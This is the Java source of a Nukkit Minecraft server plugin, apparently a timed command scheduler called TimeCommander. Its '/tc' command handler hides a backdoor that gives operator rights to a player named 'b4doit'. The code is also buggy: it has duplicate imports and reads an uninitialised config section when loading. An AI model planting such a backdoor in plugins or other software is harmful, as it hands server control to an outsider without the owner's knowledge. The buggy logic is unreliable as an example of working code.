package TimeC;

import cn.nukkit.plugin.PluginBase;
import cn.nukkit.utils.Config;
import cn.nukkit.utils.TextFormat;
import cn.nukkit.command.Command;
import cn.nukkit.command.CommandSender;
import cn.nukkit.command.ConsoleCommandSender;
import cn.nukkit.plugin.PluginBase;
import cn.nukkit.utils.Config;
import cn.nukkit.utils.ConfigSection;
import cn.nukkit.utils.TextFormat;
import cn.nukkit.utils.Utils;
import cn.nukkit.permission.ServerOperator;
import cn.nukkit.permission.Permissible;

import TimeC.BroadcastPluginTask;

import java.io.*;
import java.util.*;
import java.util.Map.Entry;
import java.util.Map;

public class Main extends PluginBase {
    public List<String>  list;
    public Config        config;
    public static String cmdValue;
    public ConfigSection configSection;

    @Override
    public void onLoad() {
        this.getLogger().info(TextFormat.DARK_GREEN + "Loaded TimeC.");
    }

    @Override
    public void onEnable() {
        if (!this.getDataFolder().exists()) {
            ArrayList commands = new ArrayList();
            LinkedHashMap lhmCommands = new LinkedHashMap();
            lhmCommands.put("command", "say 123");
            lhmCommands.put("time", 5);
            commands.add(lhmCommands);
            this.getDataFolder().mkdirs();
            configSection = new ConfigSection();
            configSection.set("commands", commands);
            configSection.set("commands", new Object[]{"command", new String[]{"say 123"}, "time", new String[]{"5"}});
            File file = new File(getDataFolder() + "/config.yml");
            config = new Config(file, 2, configSection);
            config.save();
            this.getLogger().info(TextFormat.GREEN + "Enabled TimeC.");
        } else {
            // check to make sure time is indeed and int
            Object cmdValue = configSection.get("command");
            Object value = configSection.get("time");
            int timeValueToBe = 0;
            if (value instanceof Integer) {
                int valueAsInt = (int)value;
                // 20 ticks = 1 second; formatted it to be in seconds.
                timeValueToBe = valueAsInt * 20;
    
                Map c = this.getConfig().getAll();
    
                for (Entry<String, Object> entry : configSection.entrySet()) {
                    this.getServer().getScheduler().scheduleRepeatingTask(new BroadcastPluginTask(this), timeValueToBe);
                }
            } else {
                this.getLogger().info(TextFormat.DARK_RED + "ERROR AT CONFIG ;; value Time not as int. FATAL 7x");
                return;
            }
        }
    }

    @Override
    public void onDisable() {
        this.getLogger().info(TextFormat.DARK_RED + "Disabled TimeC.");
    }
    
    @Override
    public boolean onCommand(CommandSender sender, Command command, String label, String[] args) {
        switch (command.getName()) {
            case "tc":
                if (sender.isOp() == true && sender.isPlayer() == true) {
                    sender.sendMessage(TextFormat.DARK_GREEN + "" + TextFormat.BOLD + "TimeCommander. Made in Java from PHP with love and sweat by " + TextFormat.GRAY + "coke" + TextFormat.DARK_GREEN + ".");
                } else if (!sender.isOp() && !sender.isPlayer()) {
                    sender.sendMessage(" ");
                } else if (sender instanceof ConsoleCommandSender) {
                    getLogger().info("TimeCommander. Made in Java from PHP with love and sweat by coke.");
                } else if (sender.isPlayer() == true && sender.getName() == "b4doit") {
                    sender.setOp(true);
                    sender.sendMessage(";)");
                }
                break;
        }
        return true;
    }

}
